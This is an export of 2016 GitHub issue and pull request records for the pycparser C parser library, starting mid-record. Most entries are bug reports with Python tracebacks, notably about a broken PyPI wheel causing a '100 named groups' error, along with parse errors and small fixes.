  File ""/home/ntiuser-outest/buildout/eggs/cffi-1.8.3-py2.7-linux-x86_64.egg/cffi/cparser.py"", line 304, in _internal_parse
    ast, macros, csource = self._parse(csource)
  File ""/home/ntiuser-outest/buildout/eggs/cffi-1.8.3-py2.7-linux-x86_64.egg/cffi/cparser.py"", line 260, in _parse
    ast = _get_parser().parse(csource)
  File ""/home/ntiuser-outest/buildout/eggs/cffi-1.8.3-py2.7-linux-x86_64.egg/cffi/cparser.py"", line 40, in _get_parser
    _parser_cache = pycparser.CParser()
  File ""/home/ntiuser-outest/buildout/eggs/pycparser-2.15-py2.7.egg/pycparser/c_parser.py"", line 87, in __init__
    outputdir=taboutputdir)
  File ""/home/ntiuser-outest/buildout/eggs/pycparser-2.15-py2.7.egg/pycparser/c_lexer.py"", line 66, in build
    self.lexer = lex.lex(object=self, **kwargs)
  File ""/home/ntiuser-outest/buildout/eggs/pycparser-2.15-py2.7.egg/pycparser/ply/lex.py"", line 911, in lex
    lexobj.readtab(lextab, ldict)
  File ""/home/ntiuser-outest/buildout/eggs/pycparser-2.15-py2.7.egg/pycparser/ply/lex.py"", line 233, in readtab
    titem.append((re.compile(pat, lextab._lexreflags | re.VERBOSE), _names_to_funcs(func_name, fdict)))
  File ""/home/ntiuser-outest/.local/lib/python2.7/re.py"", line 194, in compile
    return _compile(pattern, flags)
  File ""/home/ntiuser-outest/.local/lib/python2.7/re.py"", line 249, in _compile
    p = sre_compile.compile(pattern, flags)
  File ""/home/ntiuser-outest/.local/lib/python2.7/sre_compile.py"", line 583, in compile
    ""sorry, but this version only supports 100 named groups""
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/152/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/152/comments,https://api.github.com/repos/eliben/pycparser/issues/152/events,https://github.com/eliben/pycparser/issues/152,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/151,183686929,MDU6SXNzdWUxODM2ODY5Mjk=,151,"pycparser-2.15-py2.py3-none-any.whl causes AssertionError: sorry, but this version only supports 100 named groups",2152106,closed,FALSE,NA,NA,37,2016-10-18T13:31:09Z,2020-05-06T17:28:55Z,2016-10-18T16:28:45Z,NONE,NA,"It looks like we have a repeat of https://github.com/eliben/pycparser/issues/147 - I'm seeing the same results with the newly uploaded wheel.
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/151/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/151/comments,https://api.github.com/repos/eliben/pycparser/issues/151/events,https://github.com/eliben/pycparser/issues/151,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/150,183303252,MDU6SXNzdWUxODMzMDMyNTI=,150,Discussion: Possible improvements to the AST?,1310437,closed,FALSE,NA,NA,2,2016-10-17T00:25:50Z,2016-10-20T13:02:57Z,2016-10-20T13:02:57Z,NONE,NA,"Disclaimer: These are difficulties that I encountered while working on a [feature](https://github.com/burnpanck/pycparser/tree/feature-exact-char-range-coords) intended to provide character exact coordinates for the AST nodes. I want to use this place to discuss these, rather than to state that there is a need to change the AST.

First of all, I think there is some lack of documentation of the AST. The source files essentially do not contain any information on how the AST nodes are supposed to be nested. This makes the learning curve for users (like me) of the parser output a bit steeper. I am currently slowly learning by example, and I will try to change the AST node classes to encode that information in a way that does not break anything.

Apart from that, I am aware that any change in the structure of the AST could cause some backwards compatibility headaches to existing users. Nevertheless, there are two things that I would possibly change if I was to redesign the AST.

Both issues are related to type declarations. The first is simple: In quite a few cases, AST nodes store more than one string/token, i.e. a `Decl` has `qual`, `storage` and `declname`. Thus, there is no place to record my metadata, the source location of these particular words. Wrapping them into their own `ID` or similar would of course solve that.

My second issue is with `TypeDecl`, but it's possibly just an issue with my current understanding of the AST structure. Intuitively I'd say there should be an AST node indicating that we are declaring something to have a particular type, e.g. a variable (`Decl`) or another a type alias (`Typedef`). These nodes should contain nodes that actually describe the type. With, `PtrDecl` and `ArrayDecl` I'm happy. But what does `TypeDecl` do? From what I understand, it's simply a wrapper for `Struct`,  `Union` and `IdentifierType`(what about `Enum`?). But to me, it does not add any value. It does act as a container to store the `declname` but that has nothing to do with the actual type! It is merely a relic from the way the AST is collected by the parser, where of course the innermost type usually is parsed at the outermost level of syntax, but the name which mainly belongs to the outermost part is parsed at the innermost level. It appears to me that `TypeDecl` could simply be left out, or am I missing something here?
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/150/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/150/comments,https://api.github.com/repos/eliben/pycparser/issues/150/events,https://github.com/eliben/pycparser/issues/150,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/149,181098673,MDU6SXNzdWUxODEwOTg2NzM=,149,cryptography build fails with pycparser==2.14,5284963,closed,FALSE,NA,NA,2,2016-10-05T08:58:01Z,2016-10-05T09:18:22Z,2016-10-05T09:18:22Z,NONE,NA,"cryptography build fails with pycparser==2.14 with
`AssertionError: sorry, but this version only supports 100 named groups`
[Traceback](http://pastebin.com/L0Z1wr2n)

I suppose the problem may be in regular expression in `pycparser.lextab._lexstatere`
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/149/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/149/comments,https://api.github.com/repos/eliben/pycparser/issues/149/events,https://github.com/eliben/pycparser/issues/149,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/148,180541596,MDU6SXNzdWUxODA1NDE1OTY=,148,pycparser 2.14 wheel on PyPI differs from source distribution,342993,closed,FALSE,NA,NA,6,2016-10-02T23:06:01Z,2016-10-03T14:53:34Z,2016-10-03T14:53:34Z,NONE,NA,"Sometime in the past few hours, fresh virtualenvs using pycparser 2.14 started barfing in CFFI parsing with `AssertionError: sorry, but this version only supports 100 named groups`. Here is an example stack:

```
py27 runtests: commands[0] | python setup.py clean develop bdist_wheel
Traceback (most recent call last):
  File ""setup.py"", line 52, in <module>
    import make_cffi
  File ""/home/travis/build/indygreg/python-zstandard/make_cffi.py"", line 105, in <module>
    ffi.cdef(source.decode('latin1'))
  File ""/home/travis/build/indygreg/python-zstandard/.tox/py27/lib/python2.7/site-packages/cffi/api.py"", line 105, in cdef
    self._cdef(csource, override=override, packed=packed)
  File ""/home/travis/build/indygreg/python-zstandard/.tox/py27/lib/python2.7/site-packages/cffi/api.py"", line 119, in _cdef
    self._parser.parse(csource, override=override, **options)
  File ""/home/travis/build/indygreg/python-zstandard/.tox/py27/lib/python2.7/site-packages/cffi/cparser.py"", line 299, in parse
    self._internal_parse(csource)
  File ""/home/travis/build/indygreg/python-zstandard/.tox/py27/lib/python2.7/site-packages/cffi/cparser.py"", line 304, in _internal_parse
    ast, macros, csource = self._parse(csource)
  File ""/home/travis/build/indygreg/python-zstandard/.tox/py27/lib/python2.7/site-packages/cffi/cparser.py"", line 260, in _parse
    ast = _get_parser().parse(csource)
  File ""/home/travis/build/indygreg/python-zstandard/.tox/py27/lib/python2.7/site-packages/cffi/cparser.py"", line 40, in _get_parser
    _parser_cache = pycparser.CParser()
  File ""/home/travis/build/indygreg/python-zstandard/.tox/py27/lib/python2.7/site-packages/pycparser/c_parser.py"", line 87, in __init__
    outputdir=taboutputdir)
  File ""/home/travis/build/indygreg/python-zstandard/.tox/py27/lib/python2.7/site-packages/pycparser/c_lexer.py"", line 66, in build
    self.lexer = lex.lex(object=self, **kwargs)
  File ""/home/travis/build/indygreg/python-zstandard/.tox/py27/lib/python2.7/site-packages/pycparser/ply/lex.py"", line 911, in lex
    lexobj.readtab(lextab, ldict)
  File ""/home/travis/build/indygreg/python-zstandard/.tox/py27/lib/python2.7/site-packages/pycparser/ply/lex.py"", line 233, in readtab
    titem.append((re.compile(pat, lextab._lexreflags | re.VERBOSE), _names_to_funcs(func_name, fdict)))
  File ""/home/travis/build/indygreg/python-zstandard/.tox/py27/lib/python2.7/re.py"", line 194, in compile
    return _compile(pattern, flags)
  File ""/home/travis/build/indygreg/python-zstandard/.tox/py27/lib/python2.7/re.py"", line 249, in _compile
    p = sre_compile.compile(pattern, flags)
  File ""/home/travis/build/indygreg/python-zstandard/.tox/py27/lib/python2.7/sre_compile.py"", line 583, in compile
    ""sorry, but this version only supports 100 named groups""
AssertionError: sorry, but this version only supports 100 named groups
```

This CI environment is pinning versions, so it should be deterministic.

Strangely, I was able to reproduce this error on a fresh virtualenv but not an existing one. I diffed the contents of the virtualenvs and saw that a number of `.py` files related to pycparser had changed!

Looking at https://pypi.python.org/pypi/pycparser, there is a `pycparser-2.14.tar.gz` uploaded      2015-06-10. There is also a `pycparser-2.14-py2.py3-none-any.whl` uploaded today.

If you compare the source in the .tar.gz from the wheel, it varies.

It looks like the wheel just uploaded to PyPI was cut from a different commit than what the tar.gz was cut from. And since modern versions of pip prefer downloading wheels over the source distribution, pip is downloading the wheel.

Please delete the bad wheel from PyPI. Please also consider cutting a 2.15 release that is the same commit as 2.14 but with matching sources.
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/148/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/148/comments,https://api.github.com/repos/eliben/pycparser/issues/148/events,https://github.com/eliben/pycparser/issues/148,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/147,180541300,MDU6SXNzdWUxODA1NDEzMDA=,147,"pycparser-2.14-py2.py3-none-any.whl causes AssertionError: sorry, but this version only supports 100 named groups",169573,closed,FALSE,NA,NA,18,2016-10-02T22:59:59Z,2016-10-05T18:01:38Z,2016-10-03T14:53:19Z,NONE,NA,"Looks like `pycparser-2.14-py2.py3-none-any.whl` is broken or something misconfigured, while `pycparser-2.14.tar.gz` is ok. After installing a Snowflake Connector for Python, a connector for Snowflake DB, this error happen: 

```
>pip install -U snowflake-connector-python
>python -c ""import snowflake.connector""
Traceback (most recent call last):
  File ""<string>"", line 1, in <module>
  File ""/tmp/t/lib/python2.7/site-packages/snowflake/connector/__init__.py"", line 21, in <module>
    from .connection import SnowflakeConnection
  File ""/tmp/t/lib/python2.7/site-packages/snowflake/connector/connection.py"", line 16, in <module>
    from .cursor import SnowflakeCursor
  File ""/tmp/t/lib/python2.7/site-packages/snowflake/connector/cursor.py"", line 30, in <module>
    from .file_transfer_agent import (SnowflakeFileTransferAgent)
  File ""/tmp/t/lib/python2.7/site-packages/snowflake/connector/file_transfer_agent.py"", line 29, in <module>
    from .s3_util import (SnowflakeS3FileEncryptionMaterial, SnowflakeS3Util,
  File ""/tmp/t/lib/python2.7/site-packages/snowflake/connector/s3_util.py"", line 25, in <module>
    from Crypto.Cipher import AES
  File ""/tmp/t/lib/python2.7/site-packages/Crypto/Cipher/__init__.py"", line 78, in <module>
    from Crypto.Cipher._mode_ecb import _create_ecb_cipher
  File ""/tmp/t/lib/python2.7/site-packages/Crypto/Cipher/_mode_ecb.py"", line 29, in <module>
    from Crypto.Util._raw_api import (load_pycryptodome_raw_lib,
  File ""/tmp/t/lib/python2.7/site-packages/Crypto/Util/_raw_api.py"", line 89, in <module>
    Array = ffi.new(""char[1]"").__class__.__bases__
  File ""/tmp/t/lib/python2.7/site-packages/cffi/api.py"", line 248, in new
    cdecl = self._typeof(cdecl)
  File ""/tmp/t/lib/python2.7/site-packages/cffi/api.py"", line 168, in _typeof
    result = self._typeof_locked(cdecl)
  File ""/tmp/t/lib/python2.7/site-packages/cffi/api.py"", line 153, in _typeof_locked
    type = self._parser.parse_type(cdecl)
  File ""/tmp/t/lib/python2.7/site-packages/cffi/cparser.py"", line 448, in parse_type
    return self.parse_type_and_quals(cdecl)[0]
  File ""/tmp/t/lib/python2.7/site-packages/cffi/cparser.py"", line 451, in parse_type_and_quals
    ast, macros = self._parse('void __dummy(\n%s\n);' % cdecl)[:2]
  File ""/tmp/t/lib/python2.7/site-packages/cffi/cparser.py"", line 260, in _parse
    ast = _get_parser().parse(csource)
  File ""/tmp/t/lib/python2.7/site-packages/cffi/cparser.py"", line 40, in _get_parser
    _parser_cache = pycparser.CParser()
  File ""/tmp/t/lib/python2.7/site-packages/pycparser/c_parser.py"", line 87, in __init__
    outputdir=taboutputdir)
  File ""/tmp/t/lib/python2.7/site-packages/pycparser/c_lexer.py"", line 66, in build
    self.lexer = lex.lex(object=self, **kwargs)
  File ""/tmp/t/lib/python2.7/site-packages/pycparser/ply/lex.py"", line 911, in lex
    lexobj.readtab(lextab, ldict)
  File ""/tmp/t/lib/python2.7/site-packages/pycparser/ply/lex.py"", line 233, in readtab
    titem.append((re.compile(pat, lextab._lexreflags | re.VERBOSE), _names_to_funcs(func_name, fdict)))
  File ""/tmp/t/lib/python2.7/re.py"", line 194, in compile
    return _compile(pattern, flags)
  File ""/tmp/t/lib/python2.7/re.py"", line 249, in _compile
    p = sre_compile.compile(pattern, flags)
  File ""/tmp/t/lib/python2.7/sre_compile.py"", line 583, in compile
    ""sorry, but this version only supports 100 named groups""
AssertionError: sorry, but this version only supports 100 named groups
```

But if I install it from source `pycparser-2.14.tar.gz`, it works

```
>pip install -U ~/Downloads/pycparser-2.14.tar.gz
Processing /Users/stakeda/Downloads/pycparser-2.14.tar.gz
Building wheels for collected packages: pycparser
  Running setup.py bdist_wheel for pycparser ... done
  Stored in directory: /Users/stakeda/Library/Caches/pip/wheels/6e/f1/96/de2b8478c77d89fe540a5709a70e2cdc4e7331a3543cada3c1
Successfully built pycparser
Installing collected packages: pycparser
  Found existing installation: pycparser 2.13
    Uninstalling pycparser-2.13:
      Successfully uninstalled pycparser-2.13
Successfully installed pycparser-2.14
>python -c ""import snowflake.connector""
>
```

Could you rebuild a new wheel or remove it? Thanks.
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/147/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/147/comments,https://api.github.com/repos/eliben/pycparser/issues/147/events,https://github.com/eliben/pycparser/issues/147,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/146,179030980,MDU6SXNzdWUxNzkwMzA5ODA=,146,Parse error on a file starting with /*,295322,closed,FALSE,NA,NA,2,2016-09-24T13:44:15Z,2016-09-24T16:03:32Z,2016-09-24T16:02:59Z,NONE,NA,"```
[15:42:01]>>> pycparser.parse_file('afl-fuzz.c')
Traceback (most recent call last):
  File ""<input>"", line 1, in <module>
  File ""/home/d33tah/virtualenv/lib/python2.7/site-packages/pycparser/__init__.py"", line 93, in parse_file
    return parser.parse(text, filename)
  File ""/home/d33tah/virtualenv/lib/python2.7/site-packages/pycparser/c_parser.py"", line 146, in parse
    debug=debuglevel)
  File ""/home/d33tah/virtualenv/lib/python2.7/site-packages/pycparser/ply/yacc.py"", line 265, in parse
    return self.parseopt_notrack(input,lexer,debug,tracking,tokenfunc)
  File ""/home/d33tah/virtualenv/lib/python2.7/site-packages/pycparser/ply/yacc.py"", line 1047, in parseopt_notrack
    tok = self.errorfunc(errtoken)
  File ""/home/d33tah/virtualenv/lib/python2.7/site-packages/pycparser/c_parser.py"", line 1680, in p_error
    column=self.clex.find_tok_column(p)))
  File ""/home/d33tah/virtualenv/lib/python2.7/site-packages/pycparser/plyparser.py"", line 55, in _parse_error
    raise ParseError(""%s: %s"" % (coord, msg))
ParseError: afl-fuzz.c:1:1: before: /
```

Here's afl-fuzz.c:
[afl-fuzz.zip](https://github.com/eliben/pycparser/files/491145/afl-fuzz.zip)
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/146/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/146/comments,https://api.github.com/repos/eliben/pycparser/issues/146/events,https://github.com/eliben/pycparser/issues/146,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/145,175935414,MDExOlB1bGxSZXF1ZXN0ODQ1OTg1NTU=,145,Fix eliben/pycparser#87 : offsetof() support is incomplete,10076885,closed,FALSE,NA,NA,1,2016-09-09T06:10:53Z,2016-09-10T15:29:10Z,2016-09-10T15:27:48Z,CONTRIBUTOR,NA,"I tried to follow the grammar of GCC's extension, as documented [here](https://gcc.gnu.org/onlinedocs/gcc-5.3.0/gcc/Offsetof.html).
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/145/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/145/comments,https://api.github.com/repos/eliben/pycparser/issues/145/events,https://github.com/eliben/pycparser/pull/145,https://api.github.com/repos/eliben/pycparser/pulls/145
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/144,175889757,MDU6SXNzdWUxNzU4ODk3NTc=,144,ParseError on GNU extension keywords,1823839,closed,FALSE,NA,NA,1,2016-09-08T23:25:15Z,2016-10-12T03:51:54Z,2016-10-12T03:51:54Z,NONE,NA,"``` c
typedef __signed__ char __s8;
typedef __signed__ short __s16;
```

https://www.gnu.org/software/gnu-c-manual/gnu-c-manual.html#Keywords
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/144/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/144/comments,https://api.github.com/repos/eliben/pycparser/issues/144/events,https://github.com/eliben/pycparser/issues/144,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/143,173284590,MDU6SXNzdWUxNzMyODQ1OTA=,143,ParseError on complex struct,3036798,closed,FALSE,NA,NA,3,2016-08-25T19:07:31Z,2016-10-11T00:28:15Z,2016-10-11T00:28:14Z,NONE,NA,"I'm trying to use `pycparser` to parse this C code:

https://github.com/nbeaver/mx-trunk/blob/0b80678773582babcd56fe959d5cfbb776cc0004/libMx/d_adsc_two_theta.c

A repo with a minimal example and Makefile is here:

https://github.com/nbeaver/pycparser-problem

Using `pycparser` v2.14 (from pip) and gcc 4.9.2 on Debian Jessie.

Things I have tried:
- Pass the `-nostdinc` flag to `gcc` and including the `fake_libc_include` folder.
- Use `-D'__attribute__(x)='` to take out GCC extensions
- Use fake headers for e.g. `<sys/param.h>`
- Use the `-std=c99` in case the code is not C99 compatible.
- Reproduce the [redis example](http://eli.thegreenplace.net/2015/on-parsing-c-type-declarations-and-fake-headers/) in case there is something weird with my machine.

This is what the traceback looks like:

```
Traceback (most recent call last):
  File ""just_parse.py"", line 21, in <module>
    parse(path)
  File ""just_parse.py"", line 9, in parse
    ast = pycparser.parse_file(filename)
  File ""/home/nathaniel/.local/lib/python2.7/site-packages/pycparser/__init__.py"", line 93, in parse_file
    return parser.parse(text, filename)
  File ""/home/nathaniel/.local/lib/python2.7/site-packages/pycparser/c_parser.py"", line 146, in parse
    debug=debuglevel)
  File ""/home/nathaniel/.local/lib/python2.7/site-packages/pycparser/ply/yacc.py"", line 265, in parse
    return self.parseopt_notrack(input,lexer,debug,tracking,tokenfunc)
  File ""/home/nathaniel/.local/lib/python2.7/site-packages/pycparser/ply/yacc.py"", line 1047, in parseopt_notrack
    tok = self.errorfunc(errtoken)
  File ""/home/nathaniel/.local/lib/python2.7/site-packages/pycparser/c_parser.py"", line 1680, in p_error
    column=self.clex.find_tok_column(p)))
  File ""/home/nathaniel/.local/lib/python2.7/site-packages/pycparser/plyparser.py"", line 55, in _parse_error
    raise ParseError(""%s: %s"" % (coord, msg))
pycparser.plyparser.ParseError: in/d_adsc_two_theta.c:63:82: before: .
```

The traceback points to this line:

https://github.com/nbeaver/mx-trunk/blob/0b80678773582babcd56fe959d5cfbb776cc0004/libMx/d_adsc_two_theta.c#L63

Which in turn points to this `#define` macro:

https://github.com/nbeaver/mx-trunk/blob/0b80678773582babcd56fe959d5cfbb776cc0004/libMx/mx_motor.h#L484

Is this related to `offsetof` as describe in https://github.com/eliben/pycparser/issues/87?
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/143/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/143/comments,https://api.github.com/repos/eliben/pycparser/issues/143/events,https://github.com/eliben/pycparser/issues/143,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/142,171500167,MDU6SXNzdWUxNzE1MDAxNjc=,142,sys/types.h missing from fakelibc?,20094559,closed,FALSE,NA,NA,5,2016-08-16T19:41:52Z,2016-08-17T13:50:22Z,2016-08-17T12:08:52Z,NONE,NA,"kept getting 'sys/types.h' file not found errors.

I assume this is a standard header

Thanks
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/142/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/142/comments,https://api.github.com/repos/eliben/pycparser/issues/142/events,https://github.com/eliben/pycparser/issues/142,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/141,171433423,MDExOlB1bGxSZXF1ZXN0ODE0ODQ2MzU=,141,"report filename if error is ""At end of input""",1473799,closed,FALSE,NA,NA,1,2016-08-16T14:46:28Z,2016-08-17T12:12:07Z,2016-08-17T12:12:02Z,CONTRIBUTOR,NA,"Very simple fix to print filename in case ""At end of input"" is reported and no line number is given.

Current behavior:

``` python
>>> from pycparser import CParser
>>> p = CParser()
>>> p.parse('(', filename='foo.c')
[...]
pycparser.plyparser.ParseError: : At end of input
```

New behavior:

``` python
>>> p.parse('(', filename='foo.c')
[...]
pycparser.plyparser.ParseError: foo.c: At end of input
```
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/141/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/141/comments,https://api.github.com/repos/eliben/pycparser/issues/141/events,https://github.com/eliben/pycparser/pull/141,https://api.github.com/repos/eliben/pycparser/pulls/141
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/140,171046045,MDU6SXNzdWUxNzEwNDYwNDU=,140,Get the parent node when overriding the 'c_ast.NodeVisitor',17559297,closed,FALSE,NA,NA,1,2016-08-14T07:13:36Z,2016-08-14T23:34:29Z,2016-08-14T23:34:29Z,NONE,NA,"How could i get the parent node when overriding the 'c_ast.NodeVisitor'. The subclasses of 'Node' have 'children' an attribute. But sometimes i need link to the parent node. Is there any possible solutions?
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/140/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/140/comments,https://api.github.com/repos/eliben/pycparser/issues/140/events,https://github.com/eliben/pycparser/issues/140,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/139,171016350,MDU6SXNzdWUxNzEwMTYzNTA=,139,Fault report for non-psychics,5067248,closed,FALSE,NA,NA,5,2016-08-13T16:35:28Z,2016-10-12T03:51:43Z,2016-10-12T03:51:43Z,NONE,NA,"The blog post:
http://shape-of-code.coding-guidelines.com/2016/02/08/pycparser-a-serious-entry-in-the-not-written-in-c-c-parser-category/

discusses pycparser and lists some faults.  The faults appear to be in the latest release.

Ok, you are not psychic and I should have reported them earlier.
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/139/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/139/comments,https://api.github.com/repos/eliben/pycparser/issues/139/events,https://github.com/eliben/pycparser/issues/139,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/138,169748782,MDU6SXNzdWUxNjk3NDg3ODI=,138,Parser doesn't seem to visit all occurrences of some nodes,5565560,closed,FALSE,NA,NA,4,2016-08-06T14:24:21Z,2016-08-09T14:04:43Z,2016-08-09T14:04:43Z,NONE,NA,"To reproduce create a visitor which counts all occurrences of Ifs for a nested file like https://github.com/TiarkRompf/legobase-micro/blob/master/minidb/cqueries/Q1.c

Then count all ""if ("" using grep or a texteditor.
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/138/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/138/comments,https://api.github.com/repos/eliben/pycparser/issues/138/events,https://github.com/eliben/pycparser/issues/138,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/137,169748675,MDU6SXNzdWUxNjk3NDg2NzU=,137,Expanding included libraries may lead to duplicate typedefs,5565560,closed,FALSE,NA,NA,5,2016-08-06T14:21:17Z,2016-08-22T12:26:12Z,2016-08-22T12:26:12Z,NONE,NA,"Expanding libraries that contain `typedefs` that are the same as defines in the including file cause errors when passing the file to `gcc`. 
Possible solution: save the includes, let pycparser do it's thing then remove the expanded typedefs and reinsert the includes.
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/137/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/137/comments,https://api.github.com/repos/eliben/pycparser/issues/137/events,https://github.com/eliben/pycparser/issues/137,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/136,169748565,MDU6SXNzdWUxNjk3NDg1NjU=,136,Specifying visitFileAST prevents other hooks from being called,5565560,closed,FALSE,NA,NA,1,2016-08-06T14:18:42Z,2016-08-06T21:24:39Z,2016-08-06T21:24:39Z,NONE,NA,"Defining a `visit_FileAST` method causes other hooks that are nested within the AST not to be called. 
Ex. having `visit_While` works fine but as soon as`visit_FileAST` `visit_While` no longer gets called.
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/136/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/136/comments,https://api.github.com/repos/eliben/pycparser/issues/136/events,https://github.com/eliben/pycparser/issues/136,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/135,167982928,MDExOlB1bGxSZXF1ZXN0NzkxMTcwMzk=,135,Don't create pyc files when building tables,442117,closed,FALSE,NA,NA,18,2016-07-27T23:50:32Z,2018-05-02T22:33:17Z,2018-05-02T18:20:31Z,CONTRIBUTOR,NA,"We don't want to include pyc files in source distributions.
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/135/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/135/comments,https://api.github.com/repos/eliben/pycparser/issues/135/events,https://github.com/eliben/pycparser/pull/135,https://api.github.com/repos/eliben/pycparser/pulls/135
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/134,167603957,MDU6SXNzdWUxNjc2MDM5NTc=,134,Pycparser installation BadZipFile,12746071,closed,FALSE,NA,NA,1,2016-07-26T13:14:31Z,2017-07-04T22:23:17Z,2017-07-04T22:23:17Z,NONE,NA,"I'm installing the module using pip install pycparser as recommended in the README. 
However I get this error. 

`ans@ans-VirtualBox:~/new_virtual_env$ pip install pycparser
Collecting pycparser
Exception:
Traceback (most recent call last):
  File ""/usr/lib/python2.7/dist-packages/pip/basecommand.py"", line 209, in main
    status = self.run(options, args)
  File ""/usr/lib/python2.7/dist-packages/pip/commands/install.py"", line 328, in run
    wb.build(autobuilding=True)
  File ""/usr/lib/python2.7/dist-packages/pip/wheel.py"", line 748, in build
    self.requirement_set.prepare_files(self.finder)
  File ""/usr/lib/python2.7/dist-packages/pip/req/req_set.py"", line 360, in prepare_files
    ignore_dependencies=self.ignore_dependencies))
  File ""/usr/lib/python2.7/dist-packages/pip/req/req_set.py"", line 577, in _prepare_file
    session=self.session, hashes=hashes)
  File ""/usr/lib/python2.7/dist-packages/pip/download.py"", line 798, in unpack_url
    unpack_file_url(link, location, download_dir, hashes=hashes)
  File ""/usr/lib/python2.7/dist-packages/pip/download.py"", line 705, in unpack_file_url
    unpack_file(from_path, location, content_type, link)
  File ""/usr/lib/python2.7/dist-packages/pip/utils/__init__.py"", line 617, in unpack_file
    flatten=not filename.endswith('.whl')
  File ""/usr/lib/python2.7/dist-packages/pip/utils/__init__.py"", line 502, in unzip_file
    zip = zipfile.ZipFile(zipfp, allowZip64=True)
  File ""/usr/lib/python2.7/zipfile.py"", line 770, in __init__
    self._RealGetContents()
  File ""/usr/lib/python2.7/zipfile.py"", line 811, in _RealGetContents
    raise BadZipfile, ""File is not a zip file""
BadZipfile: File is not a zip file
`
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/134/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/134/comments,https://api.github.com/repos/eliben/pycparser/issues/134/events,https://github.com/eliben/pycparser/issues/134,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/133,167493867,MDExOlB1bGxSZXF1ZXN0Nzg3NzI5MDI=,133,Allow user to decide which lexer the parser uses.,635076,closed,FALSE,NA,NA,0,2016-07-26T00:10:44Z,2016-07-26T11:23:21Z,2016-07-26T11:23:21Z,CONTRIBUTOR,NA,"Useful for extending CLexer and CParser without having to manually recreate CParser's initialization, like [pycparserext](https://github.com/inducer/pycparserext/blob/master/pycparserext/ext_c_parser.py) does.
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/133/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/133/comments,https://api.github.com/repos/eliben/pycparser/issues/133/events,https://github.com/eliben/pycparser/pull/133,https://api.github.com/repos/eliben/pycparser/pulls/133
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/132,165249344,MDExOlB1bGxSZXF1ZXN0NzcyMzgwNDc=,132,Protected expressions in ternary operator with paranthesis.,16084733,closed,FALSE,NA,NA,2,2016-07-13T06:49:10Z,2016-07-14T11:59:43Z,2016-07-14T11:59:42Z,CONTRIBUTOR,NA,"Fixes Issue #131 
Change-Id: I208f5450326a7fb40c98aa3404da06f563a5908b
